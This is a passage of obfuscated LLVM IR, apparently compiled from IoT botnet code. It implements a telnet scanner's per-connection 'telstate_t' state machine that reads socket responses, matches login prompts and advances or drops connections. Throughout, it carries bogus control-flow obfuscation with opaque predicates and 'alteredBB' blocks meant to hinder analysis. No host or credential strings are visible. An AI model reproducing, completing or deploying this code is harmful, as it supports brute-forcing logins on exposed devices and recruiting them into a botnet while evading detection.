  br i1 %1907, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br label %1908

; <label>:1908:                                   ; preds = %originalBBpart2184
  %1909 = load i32, i32* %10, align 4
  %1910 = sext i32 %1909 to i64
  %1911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1910
  %1912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1911, i32 0, i32 8
  %1913 = load i8*, i8** %1912, align 8
  call void @llvm.memset.p0i8.i64(i8* %1913, i8 0, i64 1024, i32 1, i1 false)
  br label %2839

; <label>:1914:                                   ; preds = %1772
  %1915 = load i32, i32* %10, align 4
  %1916 = sext i32 %1915 to i64
  %1917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1916
  %1918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1917, i32 0, i32 0
  %1919 = load i32, i32* %1918, align 16
  %1920 = load i32, i32* %10, align 4
  %1921 = sext i32 %1920 to i64
  %1922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1921
  %1923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1922, i32 0, i32 8
  %1924 = load i8*, i8** %1923, align 8
  %1925 = load i32, i32* %10, align 4
  %1926 = sext i32 %1925 to i64
  %1927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1926
  %1928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1927, i32 0, i32 7
  %1929 = load i16, i16* %1928, align 16
  %1930 = zext i16 %1929 to i32
  %1931 = call i32 @readUntil(i32 %1919, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1924, i32 1024, i32 %1930)
  %1932 = icmp ne i32 %1931, 0
  br i1 %1932, label %1933, label %2024

; <label>:1933:                                   ; preds = %1914
  %1934 = load i32, i32* %10, align 4
  %1935 = sext i32 %1934 to i64
  %1936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1935
  %1937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1936, i32 0, i32 6
  store i32 0, i32* %1937, align 4
  %1938 = load i32, i32* %10, align 4
  %1939 = sext i32 %1938 to i64
  %1940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1939
  %1941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1940, i32 0, i32 7
  store i16 0, i16* %1941, align 16
  %1942 = load i32, i32* %10, align 4
  %1943 = sext i32 %1942 to i64
  %1944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1943
  %1945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1944, i32 0, i32 8
  %1946 = load i8*, i8** %1945, align 8
  %1947 = call i8* @strstr(i8* %1946, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %1948 = icmp ne i8* %1947, null
  br i1 %1948, label %1949, label %1985

; <label>:1949:                                   ; preds = %1933
  %1950 = load i32, i32* @x.65
  %1951 = load i32, i32* @y.66
  %1952 = sub i32 %1950, 1
  %1953 = mul i32 %1950, %1952
  %1954 = urem i32 %1953, 2
  %1955 = icmp eq i32 %1954, 0
  %1956 = icmp slt i32 %1951, 10
  %1957 = or i1 %1955, %1956
  br i1 %1957, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1949
  %1958 = load i32, i32* %10, align 4
  %1959 = sext i32 %1958 to i64
  %1960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1959
  %1961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1960, i32 0, i32 8
  %1962 = load i8*, i8** %1961, align 8
  call void @llvm.memset.p0i8.i64(i8* %1962, i8 0, i64 1024, i32 1, i1 false)
  %1963 = load i32, i32* %10, align 4
  %1964 = sext i32 %1963 to i64
  %1965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1964
  %1966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1965, i32 0, i32 0
  %1967 = load i32, i32* %1966, align 16
  %1968 = call i32 @sclose(i32 %1967)
  %1969 = load i32, i32* %10, align 4
  %1970 = sext i32 %1969 to i64
  %1971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1970
  %1972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1971, i32 0, i32 2
  store i8 0, i8* %1972, align 8
  %1973 = load i32, i32* %10, align 4
  %1974 = sext i32 %1973 to i64
  %1975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1974
  %1976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1975, i32 0, i32 3
  store i8 0, i8* %1976, align 1
  %1977 = load i32, i32* @x.65
  %1978 = load i32, i32* @y.66
  %1979 = sub i32 %1977, 1
  %1980 = mul i32 %1977, %1979
  %1981 = urem i32 %1980, 2
  %1982 = icmp eq i32 %1981, 0
  %1983 = icmp slt i32 %1978, 10
  %1984 = or i1 %1982, %1983
  br i1 %1984, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  br label %2839

; <label>:1985:                                   ; preds = %1933
  %1986 = load i32, i32* %10, align 4
  %1987 = sext i32 %1986 to i64
  %1988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1987
  %1989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1988, i32 0, i32 8
  %1990 = load i8*, i8** %1989, align 8
  %1991 = call i32 @matchPrompt(i8* %1990)
  %1992 = icmp ne i32 %1991, 0
  br i1 %1992, label %2013, label %1993

; <label>:1993:                                   ; preds = %1985
  %1994 = load i32, i32* %10, align 4
  %1995 = sext i32 %1994 to i64
  %1996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1995
  %1997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1996, i32 0, i32 8
  %1998 = load i8*, i8** %1997, align 8
  call void @llvm.memset.p0i8.i64(i8* %1998, i8 0, i64 1024, i32 1, i1 false)
  %1999 = load i32, i32* %10, align 4
  %2000 = sext i32 %1999 to i64
  %2001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2000
  %2002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2001, i32 0, i32 0
  %2003 = load i32, i32* %2002, align 16
  %2004 = call i32 @sclose(i32 %2003)
  %2005 = load i32, i32* %10, align 4
  %2006 = sext i32 %2005 to i64
  %2007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2006
  %2008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2007, i32 0, i32 2
  store i8 0, i8* %2008, align 8
  %2009 = load i32, i32* %10, align 4
  %2010 = sext i32 %2009 to i64
  %2011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2010
  %2012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2011, i32 0, i32 3
  store i8 1, i8* %2012, align 1
  br label %2839

; <label>:2013:                                   ; preds = %1985
  %2014 = load i32, i32* %10, align 4
  %2015 = sext i32 %2014 to i64
  %2016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2015
  %2017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2016, i32 0, i32 2
  store i8 7, i8* %2017, align 8
  br label %2018

; <label>:2018:                                   ; preds = %2013
  %2019 = load i32, i32* %10, align 4
  %2020 = sext i32 %2019 to i64
  %2021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2020
  %2022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2021, i32 0, i32 8
  %2023 = load i8*, i8** %2022, align 8
  call void @llvm.memset.p0i8.i64(i8* %2023, i8 0, i64 1024, i32 1, i1 false)
  br label %2839

; <label>:2024:                                   ; preds = %1914
  %2025 = load i32, i32* %10, align 4
  %2026 = sext i32 %2025 to i64
  %2027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2026
  %2028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2027, i32 0, i32 0
  %2029 = load i32, i32* %2028, align 16
  %2030 = load i32, i32* %10, align 4
  %2031 = sext i32 %2030 to i64
  %2032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2031
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2032, i32 0, i32 8
  %2034 = load i8*, i8** %2033, align 8
  %2035 = load i32, i32* %10, align 4
  %2036 = sext i32 %2035 to i64
  %2037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2036
  %2038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2037, i32 0, i32 7
  %2039 = load i16, i16* %2038, align 16
  %2040 = zext i16 %2039 to i32
  %2041 = call i32 @readUntil(i32 %2029, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2034, i32 1024, i32 %2040)
  %2042 = icmp ne i32 %2041, 0
  br i1 %2042, label %2043, label %2150

; <label>:2043:                                   ; preds = %2024
  %2044 = load i32, i32* %10, align 4
  %2045 = sext i32 %2044 to i64
  %2046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2045
  %2047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2046, i32 0, i32 6
  store i32 0, i32* %2047, align 4
  %2048 = load i32, i32* %10, align 4
  %2049 = sext i32 %2048 to i64
  %2050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2049
  %2051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2050, i32 0, i32 7
  store i16 0, i16* %2051, align 16
  %2052 = load i32, i32* %10, align 4
  %2053 = sext i32 %2052 to i64
  %2054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2053
  %2055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2054, i32 0, i32 8
  %2056 = load i8*, i8** %2055, align 8
  %2057 = call i8* @strstr(i8* %2056, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %2058 = icmp ne i8* %2057, null
  br i1 %2058, label %2059, label %2079

; <label>:2059:                                   ; preds = %2043
  %2060 = load i32, i32* %10, align 4
  %2061 = sext i32 %2060 to i64
  %2062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2061
  %2063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2062, i32 0, i32 8
  %2064 = load i8*, i8** %2063, align 8
  call void @llvm.memset.p0i8.i64(i8* %2064, i8 0, i64 1024, i32 1, i1 false)
  %2065 = load i32, i32* %10, align 4
  %2066 = sext i32 %2065 to i64
  %2067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2066
  %2068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2067, i32 0, i32 0
  %2069 = load i32, i32* %2068, align 16
  %2070 = call i32 @sclose(i32 %2069)
  %2071 = load i32, i32* %10, align 4
  %2072 = sext i32 %2071 to i64
  %2073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2072
  %2074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2073, i32 0, i32 2
  store i8 0, i8* %2074, align 8
  %2075 = load i32, i32* %10, align 4
  %2076 = sext i32 %2075 to i64
  %2077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2076
  %2078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2077, i32 0, i32 3
  store i8 0, i8* %2078, align 1
  br label %2839

; <label>:2079:                                   ; preds = %2043
  %2080 = load i32, i32* %10, align 4
  %2081 = sext i32 %2080 to i64
  %2082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2081
  %2083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2082, i32 0, i32 8
  %2084 = load i8*, i8** %2083, align 8
  %2085 = call i32 @matchPrompt(i8* %2084)
  %2086 = icmp ne i32 %2085, 0
  br i1 %2086, label %2123, label %2087

; <label>:2087:                                   ; preds = %2079
  %2088 = load i32, i32* @x.65
  %2089 = load i32, i32* @y.66
  %2090 = sub i32 %2088, 1
  %2091 = mul i32 %2088, %2090
  %2092 = urem i32 %2091, 2
  %2093 = icmp eq i32 %2092, 0
  %2094 = icmp slt i32 %2089, 10
  %2095 = or i1 %2093, %2094
  br i1 %2095, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %2087
  %2096 = load i32, i32* %10, align 4
  %2097 = sext i32 %2096 to i64
  %2098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2097
  %2099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2098, i32 0, i32 8
  %2100 = load i8*, i8** %2099, align 8
  call void @llvm.memset.p0i8.i64(i8* %2100, i8 0, i64 1024, i32 1, i1 false)
  %2101 = load i32, i32* %10, align 4
  %2102 = sext i32 %2101 to i64
  %2103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2102
  %2104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2103, i32 0, i32 0
  %2105 = load i32, i32* %2104, align 16
  %2106 = call i32 @sclose(i32 %2105)
  %2107 = load i32, i32* %10, align 4
  %2108 = sext i32 %2107 to i64
  %2109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2108
  %2110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2109, i32 0, i32 2
  store i8 0, i8* %2110, align 8
  %2111 = load i32, i32* %10, align 4
  %2112 = sext i32 %2111 to i64
  %2113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2112
  %2114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2113, i32 0, i32 3
  store i8 1, i8* %2114, align 1
  %2115 = load i32, i32* @x.65
  %2116 = load i32, i32* @y.66
  %2117 = sub i32 %2115, 1
  %2118 = mul i32 %2115, %2117
  %2119 = urem i32 %2118, 2
  %2120 = icmp eq i32 %2119, 0
  %2121 = icmp slt i32 %2116, 10
  %2122 = or i1 %2120, %2121
  br i1 %2122, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br label %2839

; <label>:2123:                                   ; preds = %2079
  %2124 = load i32, i32* @x.65
  %2125 = load i32, i32* @y.66
  %2126 = sub i32 %2124, 1
  %2127 = mul i32 %2124, %2126
  %2128 = urem i32 %2127, 2
  %2129 = icmp eq i32 %2128, 0
  %2130 = icmp slt i32 %2125, 10
  %2131 = or i1 %2129, %2130
  br i1 %2131, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %2123
  %2132 = load i32, i32* %10, align 4
  %2133 = sext i32 %2132 to i64
  %2134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2133
  %2135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2134, i32 0, i32 2
  store i8 7, i8* %2135, align 8
  %2136 = load i32, i32* @x.65
  %2137 = load i32, i32* @y.66
  %2138 = sub i32 %2136, 1
  %2139 = mul i32 %2136, %2138
  %2140 = urem i32 %2139, 2
  %2141 = icmp eq i32 %2140, 0
  %2142 = icmp slt i32 %2137, 10
  %2143 = or i1 %2141, %2142
  br i1 %2143, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br label %2144

; <label>:2144:                                   ; preds = %originalBBpart2196
  %2145 = load i32, i32* %10, align 4
  %2146 = sext i32 %2145 to i64
  %2147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2146
  %2148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2147, i32 0, i32 8
  %2149 = load i8*, i8** %2148, align 8
  call void @llvm.memset.p0i8.i64(i8* %2149, i8 0, i64 1024, i32 1, i1 false)
  br label %2839

; <label>:2150:                                   ; preds = %2024
  %2151 = load i32, i32* %10, align 4
  %2152 = sext i32 %2151 to i64
  %2153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2152
  %2154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2153, i32 0, i32 0
  %2155 = load i32, i32* %2154, align 16
  %2156 = load i32, i32* %10, align 4
  %2157 = sext i32 %2156 to i64
  %2158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2157
  %2159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2158, i32 0, i32 8
  %2160 = load i8*, i8** %2159, align 8
  %2161 = load i32, i32* %10, align 4
  %2162 = sext i32 %2161 to i64
  %2163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2162
  %2164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2163, i32 0, i32 7
  %2165 = load i16, i16* %2164, align 16
  %2166 = zext i16 %2165 to i32
  %2167 = call i32 @readUntil(i32 %2155, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2160, i32 1024, i32 %2166)
  %2168 = icmp ne i32 %2167, 0
  br i1 %2168, label %2169, label %2260

; <label>:2169:                                   ; preds = %2150
  %2170 = load i32, i32* %10, align 4
  %2171 = sext i32 %2170 to i64
  %2172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2171
  %2173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2172, i32 0, i32 6
  store i32 0, i32* %2173, align 4
  %2174 = load i32, i32* %10, align 4
  %2175 = sext i32 %2174 to i64
  %2176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2175
  %2177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2176, i32 0, i32 7
  store i16 0, i16* %2177, align 16
  %2178 = load i32, i32* %10, align 4
  %2179 = sext i32 %2178 to i64
  %2180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2179
  %2181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2180, i32 0, i32 8
  %2182 = load i8*, i8** %2181, align 8
  %2183 = call i8* @strstr(i8* %2182, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %2184 = icmp ne i8* %2183, null
  br i1 %2184, label %2185, label %2221

; <label>:2185:                                   ; preds = %2169
  %2186 = load i32, i32* @x.65
  %2187 = load i32, i32* @y.66
  %2188 = sub i32 %2186, 1
  %2189 = mul i32 %2186, %2188
  %2190 = urem i32 %2189, 2
  %2191 = icmp eq i32 %2190, 0
  %2192 = icmp slt i32 %2187, 10
  %2193 = or i1 %2191, %2192
  br i1 %2193, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %2185
  %2194 = load i32, i32* %10, align 4
  %2195 = sext i32 %2194 to i64
  %2196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2195
  %2197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2196, i32 0, i32 8
  %2198 = load i8*, i8** %2197, align 8
  call void @llvm.memset.p0i8.i64(i8* %2198, i8 0, i64 1024, i32 1, i1 false)
  %2199 = load i32, i32* %10, align 4
  %2200 = sext i32 %2199 to i64
  %2201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2200
  %2202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2201, i32 0, i32 0
  %2203 = load i32, i32* %2202, align 16
  %2204 = call i32 @sclose(i32 %2203)
  %2205 = load i32, i32* %10, align 4
  %2206 = sext i32 %2205 to i64
  %2207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2206
  %2208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2207, i32 0, i32 2
  store i8 0, i8* %2208, align 8
  %2209 = load i32, i32* %10, align 4
  %2210 = sext i32 %2209 to i64
  %2211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2210
  %2212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2211, i32 0, i32 3
  store i8 0, i8* %2212, align 1
  %2213 = load i32, i32* @x.65
  %2214 = load i32, i32* @y.66
  %2215 = sub i32 %2213, 1
  %2216 = mul i32 %2213, %2215
  %2217 = urem i32 %2216, 2
  %2218 = icmp eq i32 %2217, 0
  %2219 = icmp slt i32 %2214, 10
  %2220 = or i1 %2218, %2219
  br i1 %2220, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br label %2839

; <label>:2221:                                   ; preds = %2169
  %2222 = load i32, i32* %10, align 4
  %2223 = sext i32 %2222 to i64
  %2224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2223
  %2225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2224, i32 0, i32 8
  %2226 = load i8*, i8** %2225, align 8
  %2227 = call i32 @matchPrompt(i8* %2226)
  %2228 = icmp ne i32 %2227, 0
  br i1 %2228, label %2249, label %2229

; <label>:2229:                                   ; preds = %2221
  %2230 = load i32, i32* %10, align 4
  %2231 = sext i32 %2230 to i64
  %2232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2231
  %2233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2232, i32 0, i32 8
  %2234 = load i8*, i8** %2233, align 8
  call void @llvm.memset.p0i8.i64(i8* %2234, i8 0, i64 1024, i32 1, i1 false)
  %2235 = load i32, i32* %10, align 4
  %2236 = sext i32 %2235 to i64
  %2237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2236
  %2238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2237, i32 0, i32 0
  %2239 = load i32, i32* %2238, align 16
  %2240 = call i32 @sclose(i32 %2239)
  %2241 = load i32, i32* %10, align 4
  %2242 = sext i32 %2241 to i64
  %2243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2242
  %2244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2243, i32 0, i32 2
  store i8 0, i8* %2244, align 8
  %2245 = load i32, i32* %10, align 4
  %2246 = sext i32 %2245 to i64
  %2247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2246
  %2248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2247, i32 0, i32 3
  store i8 1, i8* %2248, align 1
  br label %2839

; <label>:2249:                                   ; preds = %2221
  %2250 = load i32, i32* %10, align 4
  %2251 = sext i32 %2250 to i64
  %2252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2251
  %2253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2252, i32 0, i32 2
  store i8 7, i8* %2253, align 8
  br label %2254

; <label>:2254:                                   ; preds = %2249
  %2255 = load i32, i32* %10, align 4
  %2256 = sext i32 %2255 to i64
  %2257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2256
  %2258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2257, i32 0, i32 8
  %2259 = load i8*, i8** %2258, align 8
  call void @llvm.memset.p0i8.i64(i8* %2259, i8 0, i64 1024, i32 1, i1 false)
  br label %2839

; <label>:2260:                                   ; preds = %2150
  %2261 = load i32, i32* @x.65
  %2262 = load i32, i32* @y.66
  %2263 = sub i32 %2261, 1
  %2264 = mul i32 %2261, %2263
  %2265 = urem i32 %2264, 2
  %2266 = icmp eq i32 %2265, 0
  %2267 = icmp slt i32 %2262, 10
  %2268 = or i1 %2266, %2267
  br i1 %2268, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %2260
  %2269 = load i32, i32* %10, align 4
  %2270 = sext i32 %2269 to i64
  %2271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2270
  %2272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2271, i32 0, i32 0
  %2273 = load i32, i32* %2272, align 16
  %2274 = load i32, i32* %10, align 4
  %2275 = sext i32 %2274 to i64
  %2276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2275
  %2277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2276, i32 0, i32 8
  %2278 = load i8*, i8** %2277, align 8
  %2279 = load i32, i32* %10, align 4
  %2280 = sext i32 %2279 to i64
  %2281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2280
  %2282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2281, i32 0, i32 7
  %2283 = load i16, i16* %2282, align 16
  %2284 = zext i16 %2283 to i32
  %2285 = call i32 @readUntil(i32 %2273, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2278, i32 1024, i32 %2284)
  %2286 = icmp ne i32 %2285, 0
  %2287 = load i32, i32* @x.65
  %2288 = load i32, i32* @y.66
  %2289 = sub i32 %2287, 1
  %2290 = mul i32 %2287, %2289
  %2291 = urem i32 %2290, 2
  %2292 = icmp eq i32 %2291, 0
  %2293 = icmp slt i32 %2288, 10
  %2294 = or i1 %2292, %2293
  br i1 %2294, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br i1 %2286, label %2295, label %2386

; <label>:2295:                                   ; preds = %originalBBpart2204
  %2296 = load i32, i32* %10, align 4
  %2297 = sext i32 %2296 to i64
  %2298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2297
  %2299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2298, i32 0, i32 6
  store i32 0, i32* %2299, align 4
  %2300 = load i32, i32* %10, align 4
  %2301 = sext i32 %2300 to i64
  %2302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2301
  %2303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2302, i32 0, i32 7
  store i16 0, i16* %2303, align 16
  %2304 = load i32, i32* %10, align 4
  %2305 = sext i32 %2304 to i64
  %2306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2305
  %2307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2306, i32 0, i32 8
  %2308 = load i8*, i8** %2307, align 8
  %2309 = call i8* @strstr(i8* %2308, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %2310 = icmp ne i8* %2309, null
  br i1 %2310, label %2311, label %2331

; <label>:2311:                                   ; preds = %2295
  %2312 = load i32, i32* %10, align 4
  %2313 = sext i32 %2312 to i64
  %2314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2313
  %2315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2314, i32 0, i32 8
  %2316 = load i8*, i8** %2315, align 8
  call void @llvm.memset.p0i8.i64(i8* %2316, i8 0, i64 1024, i32 1, i1 false)
  %2317 = load i32, i32* %10, align 4
  %2318 = sext i32 %2317 to i64
  %2319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2318
  %2320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2319, i32 0, i32 0
  %2321 = load i32, i32* %2320, align 16
  %2322 = call i32 @sclose(i32 %2321)
  %2323 = load i32, i32* %10, align 4
  %2324 = sext i32 %2323 to i64
  %2325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2324
  %2326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2325, i32 0, i32 2
  store i8 0, i8* %2326, align 8
  %2327 = load i32, i32* %10, align 4
  %2328 = sext i32 %2327 to i64
  %2329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2328
  %2330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2329, i32 0, i32 3
  store i8 0, i8* %2330, align 1
  br label %2839

; <label>:2331:                                   ; preds = %2295
  %2332 = load i32, i32* %10, align 4
  %2333 = sext i32 %2332 to i64
  %2334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2333
  %2335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2334, i32 0, i32 8
  %2336 = load i8*, i8** %2335, align 8
  %2337 = call i32 @matchPrompt(i8* %2336)
  %2338 = icmp ne i32 %2337, 0
  br i1 %2338, label %2359, label %2339

; <label>:2339:                                   ; preds = %2331
  %2340 = load i32, i32* %10, align 4
  %2341 = sext i32 %2340 to i64
  %2342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2341
  %2343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2342, i32 0, i32 8
  %2344 = load i8*, i8** %2343, align 8
  call void @llvm.memset.p0i8.i64(i8* %2344, i8 0, i64 1024, i32 1, i1 false)
  %2345 = load i32, i32* %10, align 4
  %2346 = sext i32 %2345 to i64
  %2347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2346
  %2348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2347, i32 0, i32 0
  %2349 = load i32, i32* %2348, align 16
  %2350 = call i32 @sclose(i32 %2349)
  %2351 = load i32, i32* %10, align 4
  %2352 = sext i32 %2351 to i64
  %2353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2352
